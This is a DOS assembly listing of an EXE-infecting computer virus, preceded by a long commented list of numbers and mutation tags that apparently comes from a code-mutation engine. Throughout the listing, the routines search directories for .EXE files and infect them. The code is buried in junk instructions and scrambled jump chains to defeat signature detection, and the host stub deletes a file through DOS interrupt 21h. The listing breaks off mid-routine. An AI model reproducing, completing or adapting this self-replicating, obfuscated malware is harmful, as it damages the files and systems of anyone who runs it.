;UntouchBlock_1
;1.14760369684
;0.821469122605
;1.16158087529
;		JNZ 	_0
;1.35566812662
;1.19671280102
;0.990806527953
;1.63650664075
;UntouchBlock_0
;1.16131555518
;1.20514996381
;		JZ 	_0
;0.935233318033
;1.11027241731
;0.989890554234
;1.4278963479
;2.12579873694
;UntouchBlock_1
;1.05141393339
;ForcedJMP_0
;1.27202367411
;1.62487425266
;1.38776552542
;1.20456917107
;1.04112032677
;0.969643558691
;1.24742760508
;1.10202567241
;ForcedJMP_1
;1.0988172228
;		JZ 	_0
;0.865710600505
;1.54538118463
;0.783634540288
;		JZ 	_0
;1.11801638906
;		JZ 	_0
;0.968879831638
;1.14124567636
;UntouchBlock_1
;1.05406147495
;UntouchBlock_0
;1.35791974225
;1.04090456347
;0.992962895405
;0.913360211101
;1.01758343585
;1.31923165735
;1.01496540015
;NoMutation
;1.38136317556
;1.01265654443
;NoMutation
;0.683197211744
;1.07764790444
;ForcedJMP_0
;0.934539701984
;0.75264416515
;0.984308737028
;1.38385850119
;1.67670773496
;		JZ 	_0
;1.26678221954
;1.35434095293
;NoMutation
;0.909298198541
;ForcedJMP_1
;0.78485432957
;		JNZ 	_0
;0.961791710667
;0.829075426372
;1.28243664333
;		JZ 	_0
;1.50816153825
;ForcedJMP_1
;1.17733078886
;0.901954963455
;0.920134552082
;0.885978312478
;NoMutation
;0.997785984298
;1.13284805189
;		JZ 	_0
;0.782029762286
;0.658307797829
;0.776756628294
;1.34957780302
;1.30228095277
;0.856400534234
;1.07762660671
;1.18746480442
;ForcedJMP_1
;0.851986623954
;0.792027263951
;1.15200852473
;NoMutation
;0.87262548005
;1.09812111754
;UntouchBlock_1
;0.9255529292
;0.938247640326
;0.809995884323
;1.09809171694
;1.09360799723
;0.651893033839
;0.824508842057
;0.996626897459
;1.00145932195
;0.884744475324
;1.26217156002
;1.29491759175
;1.02916569549
;1.25590034972
;UntouchBlock_1
;0.846298325239
;0.700353316216
;0.602074741795
;1.41783856544
;0.773434471678
;0.860527006444
;1.03392872623
;		JZ 	_1
;0.803457260523
;1.15670250846
;0.958493392215
;1.12193583503
;0.869424608289
;0.893052681214
;1.1129896776
;0.776326631323
;0.675363894348
;0.936506891996
;UntouchBlock_0
;1.11848163777
;0.802430570281
;0.894673049208
;0.828134514187
;0.860895494318
;		JZ 	_0
;0.8302570346
;NoMutation
;0.731622431696
;1.20578343798
;		JNZ 	_0
;1.07914420987
;0.948103119102
;0.904446522644
;1.01234956242
;1.29296232206
;		JNZ 	_0
;0.92034587693
;NoMutation
;1.19224688882
;ForcedJMP_1
;0.785161203354
;0.988368553753
;ForcedJMP_0
;1.08147916582
;ForcedJMP_1
;0.815261971856
;1.26161491996
;UntouchBlock_0
;0.756294891237
;0.726905681966
;0.914872288379
;1.14223901703
;0.753072697015
;1.09014617998
;0.878635884124
;		JNZ 	_0
;0.810334253762
;UntouchBlock_0
;0.821813340509
;0.908488106029
;UntouchBlock_1
;0.897027227606
;ForcedJMP_1
;1.14845271121
;		JZ 	_1
;0.898260790846
;0.595287873977
;0.997849328192
;0.864337280042
;UntouchBlock_0
;0.860924170523
;0.661013553777
;0.714248335864
;0.905806997124
;0.550519256058
;0.872036054015
;0.936548762694
;UntouchBlock_0
;0.85707815856
;ForcedJMP_0
;0.814962744891
;		JZ 	_0
;0.837890924552
;		JNZ 	_1
;0.659852590672
;1.11322003165
;UntouchBlock_0
;0.765603313696
;UntouchBlock_0
;0.835840102351
;1.24004923655
;ForcedJMP_0
;0.879492499525
;0.757850788179
;0.691913698421
;1.09603688378
;UntouchBlock_1
;0.984663107865
;0.70798583304
;0.766392544398
;1.02168238027
;0.695128352031
;0.858715717483
;0.754626783022
;0.705602155521
;1.16055040338
;		JZ 	_0
;0.978511653203
;		JNZ 	_1
;0.885684454678
;0.60427273131
;		JZ 	_0
;0.596864954937
;NoMutation
;0.58337909074
;0.629512355399
;1.09697986467
;		JZ 	_1
;0.719346530532
;0.655694682851
;0.794099373228
;0.705992226253
;0.921948106328
;0.768670853792
;		JNZ 	_0
;1.16734793028
;UntouchBlock_1
;0.781662894231
;0.691428436158
;UntouchBlock_1
;0.986548637694
;0.553048192712
;0.796195401678
;		JZ 	_1
;0.949850840061
;0.973125954277
;UntouchBlock_0
;0.481218911036
;0.474425981584
;0.673925580013
;0.748624265488
;		JNZ 	_1
;1.02683704497
;0.849451068734
;NoMutation
;0.521230713727
;0.705793019854
;0.923499301785
;0.877790091504
;0.987615647032
;0.59349617264
;0.682740028097
;0.773074067733
;0.577154049377
;1.11685595824
;ForcedJMP_0
;0.971571179979
;UntouchBlock_0
;0.921411663756
;		JZ 	_0
;0.634415014999
;0.724716359955
;0.696344156381
;0.657667297358
;0.707615210218
;0.819366357123
;0.649991732675
;0.893468636184
;0.650385919299
;UntouchBlock_0
;0.729899740768
;0.706663883828
;0.861703279587
;0.630479144547
;0.830376174992
;0.880464371307
;0.640400340103
;0.588704495594
;UntouchBlock_0
;0.624771177618
;0.750361415652
;1.05021131778
;0.673219371838
;0.454585316216
;ForcedJMP_1
;0.836966157413
;ForcedJMP_0
;0.547120861381
;0.65034232861
;0.591651921503
;0.78584415467
;0.901183254056
;0.623190296192
;0.489878334593
;ForcedJMP_1
;0.548224255205
;ForcedJMP_0
;0.597069766181
;0.847823809636
;0.60624696883
;0.708330441864
;0.502987458703
;0.715676133583
;ForcedJMP_0
;0.613436546003
;0.574987062968
;UntouchBlock_0
;0.541342654042
;NoMutation
;0.618787718641
;0.521866158992
;0.621265574235
;UntouchBlock_0
;0.677493619613
;0.410442786085
;0.664779416848
;		JZ 	_1
;0.482377790182
;0.75867268045
;0.723110892542
;0.429819801085
;ForcedJMP_0
;0.686566914275
;0.531019675085
;0.628308837267
;0.484615301666
;0.322305245336
;0.546727888598
;0.561680349059
;UntouchBlock_1
;0.56420857326
;0.618564912626
;		JNZ 	_0
;0.533267978092
;UntouchBlock_1
;0.495080895456
;		JZ 	_1
;0.579976618854
;0.55958912677
;0.655205249427
;		JZ 	_0
;0.554421962982
;0.429888700427
;0.424578666126
;0.437384847761
;UntouchBlock_0
;0.473900158297
;		JZ 	_0
;0.623968325035
;		JZ 	_1
;0.450732307557
;0.336268761426
;0.466199298325
;0.371150015055
;		JNZ 	_0
;0.396798047752
;ForcedJMP_0
;0.309260363802
;0.458650437131
;ForcedJMP_0
;0.403719675959
;0.450366911225
;NoMutation
;0.348654027021
;		JZ 	_0
;0.258775100619
;0.311260535806
;0.293532701414
;0.296834419218
;NoMutation
;0.369636266161
;		JZ 	_0
;0.330092839458
;0.299755704199
;		JZ 	_0
;0.440367065765
;ForcedJMP_1
;0.314463961797
;0.328983439393
;0.332699504127
;		JNZ 	_0
;0.396371738252
;UntouchBlock_1
;0.447593437142
;0.266849395746
;0.296199200676
;		JNZ 	_0
;0.277253827592
;0.276777322674
;0.27364277852
;ForcedJMP_0
;0.256860844899
;ForcedJMP_0
;0.173648057376
;0.238537014467
;ForcedJMP_1
;0.143385933532
;ForcedJMP_0
;0.16442867103
;0.184312356873
;0.149536332004
;UntouchBlock_1
;0.153120530164
;0.164568874615
;0.122436643556
;NoMutation
;0.125972632691
;0.0946017695604
;0.122131664167
;0.116308482939
;UntouchBlock_1
;		JZ 	_0
;		JNZ 	_1
;ForcedJMP_0
 		.SEQ ;segments must appear in sequential order
HOSTSEG SEGMENT BYTE
 		ASSUME CS:HOSTSEG,SS:HSTACK
PGMSTR DB ’ABC.EXE’,0
HOST:
		JMP 	HFSQM
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
HFSQM:
	 mov ax,cs 
__LVW:
NZLBL:
UJAMM:
HWXWS:
ATCHX:
EWZEP:
QLFZK:
NYIRD:
	 mov ds,ax
		JMP 	FLXBA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
FLXBA:
		JMP 	UPHPI
nop
nop
nop
nop
nop
nop
nop
UPHPI:
		JMP 	GEHAN
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
GEHAN:
		JMP 	ROMPS
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
ROMPS:
	 mov dx,OFFSET PGMSTR
EFULL:
IWAFM:
DHQMV:
ZTUOB:
AODY_:
	 mov ah,41H
WJLTT:
BZADJ:
HGBIU:
WPSPN:
JJZGG:
JCHLC:
LGALZ:
	 int 21H 
	 mov ah,4CH
JCDVP:
NPOXM:
_YJFF:
		JMP 	TQCYI
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
TQCYI:
		JMP 	ONRA_
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ONRA_:
	 mov al,0
KEPUI:
BDTAN:
R_TPF:
BFLSV:
IOLET:
CYALZ:
	 int 21H 
HOSTSEG ENDS
HSTACK SEGMENT PARA STACK
db 100H dup (?)
HSTACK ENDS
STACKSIZE EQU 100H 
NUMRELS EQU 2 
VSEG SEGMENT PARA
 	 ASSUME CS:VSEG,DS:VSEG,SS:VSTACK
VIRUSID 	DW 0C8AAH 
OLDDTA 		DD 0 
DTA1 		DB 2BH dup (?) 
DTA2		DB 56H dup (?) 
EXE_HDR 	DB 1CH dup (?) 
EXEFILE 	DB ’\*.EXE’,0 
ALLFILE 	DB ’\*.*’,0 
USEFILE 	DB 78 dup (?) 
LEVEL 		DB 0 
HANDLE 		DW 0 
FATTR 		DB 0 
FTIME 		DW 0 
FDATE 		DW 0 
FSIZE 		DD 0 
VIDC 		DW 0 
VCODE 		DB 1 


VIRUS:
		 push ax
		JMP 	QQHBD
nop
nop
nop
nop
nop
nop
nop
nop
nop
QQHBD:
		JMP 	XKGO_
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
XKGO_:
		JMP 	ZPIRP
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZPIRP:
		 mov ax,cs
TNWP_:
OLHGT:
		JMP 	HLGDF
HXMWY:
		JMP 	ELGIV
nop
nop
nop
ELGIV:
		JMP 	I_PGK
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
I_PGK:
		JMP 	NGQ_U
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
NGQ_U:
		 mov ds,ax 						
SSF_T:
_IBPG:
BZNHO:
		JMP 	NXHYD
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
NXHYD:
		JMP 	XWJTO
nop
nop
XWJTO:
		JMP 	Z_TZI
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
Z_TZI:
		 mov ax,es 						
ESBPF:
BQQYI:
BBGWG:
JNZ FVDQS
JMP HMHO_
FVDQS:
		 mov WORD PTR [OLDDTA+2],ax 	
ZJXAS:
JZ IUCHH
JMP Y_SNP
IUCHH:
		JMP 	SDSLV
VPKNX:
		 call SHOULDRUN 				
		 jz   N1
		 JMP  REL1
		 N1: 						
		 call SETSR 
		 call NEW_DTA 					
		 call FIND_FILE 				
		 jz   N2
		 JMP  FINISH 					
		 N2:
		 call SAVE_ATTRIBUTE 			
		 call INFECT 					
		 call REST_ATTRIBUTE 			
HLGDF:
		call 	 HXMWY
SDSLV:
		call 	 VPKNX
Y_SNP:
		call 	 IUCHH


FINISH:  call RESTORE_DTA 	
QXV_G:
		call 	 YJUZO
HMHO_:
		call 	 FVDQS
YCOQB:
		call 	 TCKWC
QYYPO:
		call 	 CZUG_
GOCVK:
		call 	 KCGVE
PKXMV:
		call 	 YXB_N
 		 pop ax

REL1: 						
		JMP 	SMALW
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
SMALW:
		JMP 	QXOEE
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
QXOEE:
 		 mov ax,HSTACK 				
RVSUY:
CCJBK:
JZ YXB_N
JMP PKXMV
YXB_N:
JNZ KCGVE
JMP GOCVK
KCGVE:
JNZ TCKWC
JMP YCOQB
TCKWC:
 		 cli 
FVGPM:
		call 	 IUQAX
DZGJF:
		call 	 SNOYV
 		 mov ss,ax
JZ QPBGR
JMP UQZZL
QPBGR:
JZ CZUG_
JMP QYYPO
CZUG_:
JZ ZAQKM
JMP OSAHN
ZAQKM:
JNZ HYH_L
JMP LWKCV
OSAHN:
		call 	 ZAQKM
YGYXI:
		call 	 HPQDT
JKCJV:
		call 	 LNORA
UQZZL:
		call 	 QPBGR
HYH_L:

REL1A: 						
 		 mov sp,OFFSET HSTACK
JNZ LNORA
JMP JKCJV
LNORA:
		JMP 	H_PXJ
F_FSF:
		JMP 	ZCMIA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZCMIA:
 		 mov es,WORD PTR [OLDDTA+2] 
		JMP 	EM_FH
KTEPD:
JNZ HPQDT
JMP YGYXI
HPQDT:
		JMP 	DZGJF
SNOYV:
		JMP 	FVGPM
IUQAX:
		 mov ds,WORD PTR [OLDDTA+2] 
		cmp 	dx,ax
JZ NEBXU
JMP RAHYN
NEBXU:
JZ YCXGI
JMP NNUPT
YCXGI:
JZ VGEMD
JMP UDXNW
VGEMD:
		JMP 	RZMKQ
DFMFF:
LWKCV:
		call 	 HYH_L
H_PXJ:
		call 	 F_FSF
RZMKQ:
		call 	 DFMFF
EM_FH:
		call 	 KTEPD
NNUPT:
		call 	 YCXGI
RAHYN:
		call 	 NEBXU
 		 sti 					

REL2:					 			
AIT__:
		call 	 _AGDF
 		jmp FAR PTR HOST 
SLBQA:
		call 	 KGKQR
FSLBW:
		call 	 HCVIV
UDXNW:
		call 	 VGEMD
UZMVP:
		call 	 PABMR
VDEAY:
		call 	 TOVOI


FIND_FILE:
		JMP 	FMBCS
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
FMBCS:
		JMP 	NKWIG
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
NKWIG:
	mov al,’\’ 
JZ TOVOI
JMP VDEAY
TOVOI:
JZ PABMR
JMP UZMVP
PABMR:
		JMP 	FSLBW
HCVIV:
		JMP 	QXV_G
YJUZO:
		JMP 	IP_NL
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
IP_NL:
		JMP 	TF_KB
cmp cx,dx
cmp cx,dx
TF_KB:
	mov BYTE PTR [USEFILE],al
PHCFK:
DGDYE:
FIRNT:
JZ _AGDF
JMP AIT__
_AGDF:
		JMP 	SLNHK
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
SLNHK:
	mov si,OFFSET USEFILE+1
FDWIK:
HZCNP:
LXZMY:
OKDFP:
LMFCP:
CXK_X:
CLLZK:
	xor dl,dl
		JMP 	BTXVJ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
BTXVJ:
	mov ah,47H
PHIMZ:
QFSCI:
OPENI:
RBLJB:
RRAUO:
EZEFM:
JZ DKPMT
JMP DUKN_
DKPMT:
JNZ KGKQR
JMP SLBQA
KGKQR:
		JMP 	PQVQY
CHXIE:
	int 21H 
	cmp BYTE PTR [USEFILE+1],0 
	jz  N3
	JMP FF2 
	N3:
	xor al,al 
PQVQY:
		call 	 CHXIE
		JMP 	JMAAZ
nop
nop
nop
nop
nop
nop
nop
JMAAZ:
	mov BYTE PTR [USEFILE],al 
PVPJM:
JZ ETTTQ
JMP XPIGM
XPIGM:
		call 	 ETTTQ
DUKN_:
		call 	 DKPMT
ZTITC:
		call 	 _SU_R
ON_LB:
		call 	 DPBME
NWSAY:
		call 	 QWDMC
A_A_M:
		call 	 IBQYJ
YSFUN:
		call 	 DD_ID
KSQGV:
		call 	 AIETB
AQEST:
		call 	 JSIKL
WNQLZ:
		call 	 GJTIJ
N_CYQ:
		call 	 ADXYR
KAYJD:
		call 	 ASGDE
ETTTQ:

		JMP 	ERASX
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
ERASX:
FF2: mov al,2
		cmp 	ax,cx
JZ ASGDE
JMP KAYJD
ASGDE:
		JMP 	N_CYQ
ADXYR:
JNZ GJTIJ
JMP WNQLZ
GJTIJ:
JNZ DPBME
JMP ON_LB
DPBME:
		JMP 	ZTITC
_SU_R:
		JMP 	IELPJ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
IELPJ:
		JMP 	_YTTE
cmp cx,dx
cmp cx,dx
cmp cx,dx
_YTTE:
	mov [LEVEL],al 
GXJQM:
JNZ JSIKL
JMP AQEST
JSIKL:
		JMP 	KSQGV
AIETB:
		JMP 	YSFUN
DD_ID:
JZ IBQYJ
JMP A_A_M
IBQYJ:
	call FINDBR 
	jnz N4
	JMP FF3 
	N4:
	xor al,al 
		JMP 	V_KUG
cmp cx,dx
V_KUG:
	mov BYTE PTR [USEFILE],al 
KDNCC:
URDDG:
FIFVR:
		JMP 	NWSAY
QWDMC:
		JMP 	X_JM_
JCCKT:
		JMP 	IEIQY
AYESZ:
JZ FPMRX
JMP HMMHY
FPMRX:
	inc al 
		JMP 	YRHZT
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
YRHZT:
		JMP 	PMHNP
nop
nop
nop
nop
nop
nop
nop
PMHNP:
	mov [LEVEL],al 
IEIQY:
		call 	 AYESZ
AJPHW:
		call 	 SD_FS
X_JM_:
		call 	 JCCKT
	call FINDBR 

FF3:
HMMHY:
		call 	 FPMRX
BFHHH:
		call 	 NKPAW
MXRAH:
		call 	 WQC_N
DEGQD:
		call 	 XFNFS
	ret 

FINDBR:
	call FINDEXE 
	jc  N5
	JMP FBE3 
	N5:
	cmp [LEVEL],0 
	jnz N6
	JMP FBE1 
	N6:
	dec [LEVEL] 
		JMP 	QENLP
nop
nop
nop
nop
nop
QENLP:
		JMP 	MFECN
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
MFECN:
		JMP 	ZDFKS
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
ZDFKS:
	mov di,OFFSET USEFILE 
KDZJJ:
JZ XFNFS
JMP DEGQD
XFNFS:
JNZ SD_FS
JMP AJPHW
SD_FS:
		JMP 	MXRAH
WQC_N:
		JMP 	PPNTM
OQOJN:
		JMP 	Y_NQR
nop
nop
nop
nop
nop
nop
nop
nop
nop
Y_NQR:
	mov si,OFFSET ALLFILE 
VYZP_:
TSCQT:
JZ L_GEG
JMP LZBDP
L_GEG:
		JMP 	GMVCW
P_MDF:
JZ NKPAW
JMP BFHHH
NKPAW:
	call CONCAT 
	inc di
	push di 
	call FIRSTDIR 
	jz  N7
	JMP FBE 
PPNTM:
		call 	 OQOJN
BRDOT:
		call 	 _ASNM
PVR_Z:
		call 	 DKUJK
GMVCW:
		call 	 P_MDF
LZBDP:
		call 	 L_GEG
	N7:

FB1: 
		pop di 
		xor al,al
		stosb
		JMP 	HIXHB
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
HIXHB:
		JMP 	MQLSC
cmp cx,dx
cmp cx,dx
MQLSC:
		JMP 	MSKPO
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
MSKPO:
		JMP 	T__VZ
nop
nop
nop
nop
nop
nop
T__VZ:
		JMP 	MKKEJ
cmp cx,dx
MKKEJ:
		JMP 	BK_ZT
xor bx,cx
xor bx,cx
BK_ZT:
		mov di,OFFSET USEFILE
JNZ DKUJK
JMP PVR_Z
DKUJK:
JNZ _ASNM
JMP BRDOT
_ASNM:
		JMP 	CSJNW
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
CSJNW:
		JMP 	GNFOJ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
GNFOJ:
		JMP 	QVWNY
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
QVWNY:
		JMP 	DEYCI
xor bx,cx
xor bx,cx
DEYCI:
		mov bx,OFFSET DTA2+1EH
NTXJE:
MWRGR:
VPQRN:
PVLYK:
YRRBN:
CTBCL:
CTQGV:
		JMP 	DTGQU
DSKMY:
		JMP 	OPV__
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
OPV__:
		JMP 	UXXKA
cmp ax,bx
cmp ax,bx
UXXKA:
		JMP 	GXSZY
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
GXSZY:
		JMP 	WUQKP
cmp cx,dx
cmp cx,dx
cmp cx,dx
WUQKP:
		mov al,[LEVEL]
OQFXL:
YRPTS:
JNZ XPLOJ
JMP FGXLB
XPLOJ:
		mov dl,2BH 
TDQQV:
PLHDZ:
XFAHI:
JOCWS:
		mul dl 
		add bx,ax 
		mov si,bx
_SUJO:
QMBQO:
PLNLW:
JNZ IONLD
JMP HQLMA
IONLD:
		JMP 	NPAWE
_AQGO:
		call CONCAT 
		push di 
		call FINDBR 
		jnz N8
		JMP FBE2 
		N8:
		call NEXTDIR 
		jnz N9
		JMP FB1 
WYJTO:
		call 	 YCQTK
DTGQU:
		call 	 DSKMY
FGXLB:
		call 	 XPLOJ
HQLMA:
		call 	 IONLD
		N9:

FBE: 
		inc [LEVEL] 
		pop di 
		xor al,al 
NPAWE:
		call 	 _AQGO
MESLL:
		call 	 PTTBB
		stosb

		JMP 	WLCNA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
WLCNA:
		JMP 	DQUSK
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
DQUSK:
FBE1: mov al,1 
B_SID:
		cmp 	dx,cx
JZ WQZPU
JMP FTQLJ
WQZPU:
JNZ __YL_
JMP QTBKN
__YL_:
JNZ PTTBB
JMP MESLL
PTTBB:
		JMP 	EFOEM
ACWA_:
JNZ EVVHO
JMP IBNEP
EVVHO:
	or al,al
IBNEP:
		call 	 EVVHO
QTBKN:
		call 	 __YL_
FTQLJ:
		call 	 WQZPU
	ret

NECZS:
		call 	 UJMCT
YZPDW:
		call 	 XYKLW
FBE2: pop di 

FBE3: xor al,al 
MXTS_:
		call 	 PIHMO
EBLMG:
		call 	 DWVWT
EFOEM:
		call 	 ACWA_
MVGMI:
		call 	 RVDJV
 	  ret 


FINDEXE:
		JMP 	YYHEK
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
YYHEK:
		JMP 	UBATT
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
UBATT:
		JMP 	MJEML
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
MJEML:
		mov dx,OFFSET DTA1 
PPU_V:
XRRDX:
HWASI:
		JMP 	YZPDW
XYKLW:
		JMP 	MRSMQ
nop
nop
nop
nop
nop
MRSMQ:
		JMP 	CMLFA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
CMLFA:
		JMP 	UDUQH
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
UDUQH:
		JMP 	OGWWD
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
OGWWD:
		mov ah,1AH
ZHQIV:
LNQN_:
		JMP 	MVGMI
RVDJV:
JNZ DWVWT
JMP EBLMG
DWVWT:
JNZ YCQTK
JMP WYJTO
YCQTK:
		int 21H
		JMP 	MRBEM
nop
nop
nop
nop
MRBEM:
		JMP 	CPCMV
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
CPCMV:
		mov di,OFFSET USEFILE
KVDUC:
KDBZO:
N_YMF:
OGKCR:
ZFWZU:
ITHGM:
HYXHD:
BVUAU:
JNZ UJMCT
JMP NECZS
UJMCT:
		JMP 	KWEDL
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
KWEDL:
		mov si,OFFSET EXEFILE
BRJVF:
FRZMW:
KZDOX:
KIWQQ:
		call CONCAT 
		push di 
		JMP 	JPJET
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
JPJET:
		mov dx,OFFSET USEFILE
VUJSN:
NNEUN:
JZ R_PHI
JMP PZS_H
R_PHI:
		mov cx,3FH 
		JMP 	IRMJZ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
IRMJZ:
		mov ah,4EH
JNZ PIHMO
JMP MXTS_
PIHMO:
PZS_H:
		call 	 R_PHI
FJNDM:
		call 	 JXEXD
SVVQW:
		call 	 ORVSP
BAWML:
		call 	 HVPWW
GLNBV:
		call 	 _QTEL
		int 21H

NEXTEXE:
		or al,al 
		jz N10
		JMP FEC 
		N10:
		pop di
		inc di
		stosb 
		mov di,OFFSET USEFILE
JNZ _QTEL
JMP GLNBV
_QTEL:
JZ HVPWW
JMP BAWML
HVPWW:
		JMP 	SVVQW
ORVSP:
		JMP 	ZBGGJ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
ZBGGJ:
		mov si,OFFSET DTA1+1EH
DYEMZ:
ONDIN:
JZ JXEXD
JMP FJNDM
JXEXD:
		call CONCAT 
		dec di
		push di
		call FILE_OK 
		jc N11
		JMP FENC 
		N11:
		JMP 	CLAGO
nop
nop
nop
nop
CLAGO:
		JMP 	NRNZW
nop
nop
nop
nop
NRNZW:
		mov ah,4FH
AXILN:
PQSJI:
JZ SBJRJ
JMP ZSCY_
SBJRJ:
JZ XCVSV
JMP VXAED
XCVSV:
JZ GBIDA
